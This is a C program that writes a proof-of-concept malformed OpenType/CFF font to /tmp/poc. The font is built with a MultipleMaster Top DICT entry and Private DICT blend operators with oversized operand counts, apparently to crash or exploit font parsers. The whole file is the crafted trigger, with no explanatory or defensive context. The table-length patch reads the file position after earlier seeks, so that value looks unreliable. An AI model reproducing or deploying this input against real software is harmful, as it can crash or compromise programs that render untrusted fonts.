#include <stdio.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* OTTO header */
    fwrite("OTTO", 1, 4, f);
    fputc(0, f); fputc(1, f);       /* numTables = 1 */
    fputc(0, f); fputc(0, f);       /* searchRange */
    fputc(0, f); fputc(0, f);       /* entrySelector */
    fputc(0, f); fputc(0, f);       /* rangeShift */

    /* Table record: 16 bytes */
    fwrite("CFF ", 1, 4, f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* checksum */
    long off_pos = ftell(f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* offset */
    long len_pos = ftell(f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* length */

    long cff_base = ftell(f);

    /* CFF1 header */
    fputc(1, f);                     /* major = 1 */
    fputc(0, f);                     /* minor = 0 */
    fputc(4, f);                     /* hdrSize = 4 */
    fputc(1, f);                     /* offSize = 1 */

    /* Name INDEX: count=1, name="A" */
    fputc(0, f); fputc(1, f);       /* count = 1 */
    fputc(1, f);                     /* offSize = 1 */
    fputc(1, f);                     /* offset[0] = 1 */
    fputc(2, f);                     /* offset[1] = 2 */
    fputc('A', f);                   /* name data */

    /* Top DICT INDEX */
    fputc(0, f); fputc(1, f);       /* count = 1 */
    fputc(1, f);                     /* offSize = 1 */
    fputc(1, f);                     /* offset[0] = 1 */
    long top_off1_pos = ftell(f);
    fputc(0, f);                     /* offset[1] placeholder */
    long top_data_start = ftell(f);

    /* Top DICT data: MultipleMaster + Private + CharStrings */
    fputc(0x8B + 2, f);             /* push 2 */
    fputc(0x8B + 1, f);             /* push 1 */
    fputc(0x8B, f);                 /* push 0 */
    fputc(0x8B, f);                 /* push 0 */
    fputc(0x8B, f);                 /* push 0 */
    fputc(0x1A, f);                 /* MultipleMaster */

    /* Private DICT: <size> <offset> 0x12 */
    long priv_ref_pos = ftell(f);
    fputc(0x8B, f);                 /* size placeholder */
    fputc(0x8B, f);                 /* offset placeholder */
    fputc(0x12, f);                 /* Private */

    /* CharStrings: <offset> 0x11 */
    long char_ref_pos = ftell(f);
    fputc(0x8B, f);                 /* offset placeholder */
    fputc(0x11, f);                 /* CharStrings */

    long top_data_end = ftell(f);
    long top_data_sz = top_data_end - top_data_start;

    /* Patch offset[1] */
    fseek(f, top_off1_pos, SEEK_SET);
    fputc((uint8_t)(top_data_sz + 1), f);
    fseek(f, top_data_end, SEEK_SET);

    /* String INDEX: empty */
    fputc(0, f); fputc(0, f);       /* count = 0 */

    /* Global Subr INDEX: empty */
    fputc(0, f); fputc(0, f);       /* count = 0 */

    /* CharStrings INDEX: count=1, one endchar */
    long cs_start = ftell(f);
    fputc(0, f); fputc(1, f);       /* count = 1 */
    fputc(1, f);                     /* offSize = 1 */
    fputc(1, f);                     /* offset[0] = 1 */
    fputc(2, f);                     /* offset[1] = 2 */
    fputc(0x0E, f);                  /* endchar */

    /* Private DICT */
    long priv_start = ftell(f);
    fputc(0x8B, f); fputc(0x1E, f);  /* vsindex 0 */

    /* First blend: 15 zeros + numBlends=5 */
    for (int i = 0; i < 15; i++)
        fputc(0x8B, f);
    fputc(0x8B + 5, f);
    fputc(0x0F, f);

    /* Second blend: 24 zeros + numBlends=8 */
    for (int i = 0; i < 24; i++)
        fputc(0x8B, f);
    fputc(0x8B + 8, f);
    fputc(0x0F, f);

    long priv_end = ftell(f);
    long priv_sz = priv_end - priv_start;
    long priv_off = priv_start - cff_base;
    long cs_off = cs_start - cff_base;

    /* Patch Private DICT reference */
    fseek(f, priv_ref_pos, SEEK_SET);
    fputc((uint8_t)(priv_sz + 139), f);
    fputc((uint8_t)(priv_off + 139), f);
    fputc(0x12, f);

    /* Patch CharStrings reference */
    fseek(f, char_ref_pos, SEEK_SET);
    fputc((uint8_t)(cs_off + 139), f);
    fputc(0x11, f);

    /* Patch table record */
    long cff_end = ftell(f);
    long cff_sz = cff_end - cff_base;
    fseek(f, off_pos, SEEK_SET);
    fputc((uint8_t)(cff_base >> 24), f);
    fputc((uint8_t)(cff_base >> 16), f);
    fputc((uint8_t)(cff_base >> 8), f);
    fputc((uint8_t)(cff_base & 0xFF), f);
    fseek(f, len_pos, SEEK_SET);
    fputc((uint8_t)(cff_sz >> 24), f);
    fputc((uint8_t)(cff_sz >> 16), f);
    fputc((uint8_t)(cff_sz >> 8), f);
    fputc((uint8_t)(cff_sz & 0xFF), f);

    fclose(f);
    return 0;
}